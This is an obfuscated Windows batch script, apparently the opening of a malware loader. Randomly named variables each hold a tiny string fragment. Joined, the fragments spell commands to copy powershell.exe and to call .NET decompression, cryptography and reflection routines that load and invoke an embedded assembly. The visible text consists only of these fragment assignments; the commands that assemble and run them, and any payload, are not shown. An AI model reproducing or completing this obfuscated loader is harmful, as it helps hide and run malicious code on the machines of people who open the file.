@echo off
set "MEmdkRXCLI=he"
set "DjzaNCZcFj=we"
set "CDGHtSLNve=xe"
set "MLxMFJJTHs=he"
set "wsioGWlUBE=rs"
set "fMDRTCwZGY=ws"
set "sAccdIGSGs=do"
set "IXXQMrwKeL=em"
set "WaJEftxBBk=nd"
set "LXiuOphyNY=py"
set "xUujdxRnpC=32"
set "NEEYAtVChs=s\"
set "RDWYOYcMyb=ll"
set "FgAXjNCUhD=\W"
set "WUtMyhBnHO=ll"
set "tciJKjDTbZ=in"
set "SfvmrSvjzI= /"
set "vunvntXnon= C"
set "NKXPEWNpUh=co"
set "hBJOrPlgOB=Sy"
set "TXlpjedyTB=we"
set "hBMlEmrCqp=0\"
set "hKoPxGzrPi=rS"
set "xbzLoUmwDA=Wi"
set "fmKbJOyhlg=po"
set "OBDArvMLyT=Po"
set "UzwzryOrTR=y "
set "PUKTUaBDUP=:\"
set "yYffRenOcK=\v"
set "moWgTNevuM=.e"
set "VuVqgpLifs=1."
set "DabJQWaSty=st"
set "YAbGrQmozN=ow"
set "qsqnUdQfrZ= %~dp0"
set "vNUEBtnKfk=cd"
set "cxFoYinZEV=rity"
set "zyqZtMMwJB=Syst"
set "pRGxlTpLMu=embl"
set "QMtLBpPmSX=..-1"
set "hQItQhwEBu=tsWi"
set "sRUMfpjdUM=-joi"
set "IaheTZJJhd=em.I"
set "gBZXiwvMQB=);$d"
set "aKSSfvoFfB=Disp"
set "QqgqOlhhcK=Nfvf"
set "UaTvLdQlNN=ttlw"
set "srmjkFzopR=ert]"
set "AeNGEczdlW=ion."
set "DiSPzZoGWr=ZYYc"
set "btRbLtdbRf= = ["
set "iZRnctpyvq=.Con"
set "mGGgAovhXO=SZ.D"
set "dEulnAnoiT=]::("
set "kpnPIdKtEq=urit"
set "WVgrazQOBP=::('"
set "WyfCnlunvQ=  $J"
set "KPtmNfCiNt=.IO."
set "fOdFOGkYQx=ypto"
set "ptzQeFRDyN=Invo"
set "SWqmLTPImg=oint"
set "vXOvBzYfpk=Comp"
set "MKoaMVitgb=Z = "
set "QcsUiwDezD=BQsV"
set "BOHkegHXqr=[Sys"
set "GAbTkFURvA=ress"
set "CpxEYiTjse=]::C"
set "tKlcAjHVsS=isfL"
set "cmxhatyQSs=ct S"
